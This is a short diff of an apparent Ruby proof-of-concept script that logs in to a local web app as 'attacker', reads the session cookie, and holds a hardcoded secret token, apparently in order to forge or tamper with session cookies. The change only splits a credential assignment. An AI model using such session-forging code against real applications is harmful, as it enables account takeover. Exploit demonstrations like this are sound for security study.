@@ -6,7 +6,8 @@ secret_token = '0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f2
 a = Mechanize.new
 page = a.get 'http://localhost:3000/login'
 login = page.forms.first
-login['username'] = login['password'] = 'attacker'
+login['username'] = 'attacker'
+login['password'] = 'attacker'
 a.submit login
 
 cookie = a.cookie_jar.jar['localhost']['/'][bitses].to_s.sub("#{bitses}=", '')
